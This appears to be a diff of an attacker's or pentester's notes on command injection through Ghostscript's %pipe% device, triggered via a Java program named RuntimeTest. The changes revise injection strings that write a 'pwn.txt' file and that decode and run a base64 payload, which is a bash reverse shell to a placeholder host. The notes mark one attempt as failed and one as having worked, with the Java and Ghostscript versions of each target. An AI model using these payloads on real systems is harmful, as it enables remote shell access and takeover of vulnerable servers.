@@ -1,4 +1,4 @@
-java RuntimeTest '%pipe%{touch,/u02/projects/JavaCommandInjection/pwn.txt} -sOutputFile=' test "/u02/projects/JavaCommandInjection/"
+java RuntimeTest '%pipe%`{touch,/u02/projects/JavaCommandInjection/pwn.txt}`' test "/u02/projects/JavaCommandInjection/"
 
 :: base64 encode reverse shell
 
@@ -7,10 +7,10 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK
 
 :: pass in argument with string expansion to obtain reverse shell
 
-java RuntimeTest '%pipe%{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK}|{base64,-d}|{bash,-i} -OutputFile=' test "/u01/project/JavaCommandInjection/"
+java RuntimeTest '%pipe%`{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK}|{base64,-d}|{bash,-i}`' test "/u01/project/JavaCommandInjection/"
 
 
-:: did not work on 
+:: did not work on -- will have to try again, forgot back ticks
 
 root@kali:/u02/projects/JavaCommandInjection# /usr/bin/gs -version
 GPL Ghostscript 9.22 (2017-10-04)
@@ -21,4 +21,15 @@ openjdk version "1.8.0_151"
 OpenJDK Runtime Environment (build 1.8.0_151-8u151-b12-1-b12)
 OpenJDK Server VM (build 25.151-b12, mixed mode)
 
+
+:: Worked
+
+[oracle@soa-training JavaCI]$ java -version
+java version "1.7.0_79"
+Java(TM) SE Runtime Environment (build 1.7.0_79-b15)
+Java HotSpot(TM) 64-Bit Server VM (build 24.79-b02, mixed mode)
+
+[oracle@soa-training JavaCI]$ /usr/bin/gs -version
+GPL Ghostscript 8.70 (2009-07-31)
+Copyright (C) 2009 Artifex Software, Inc.  All rights reserved.
 
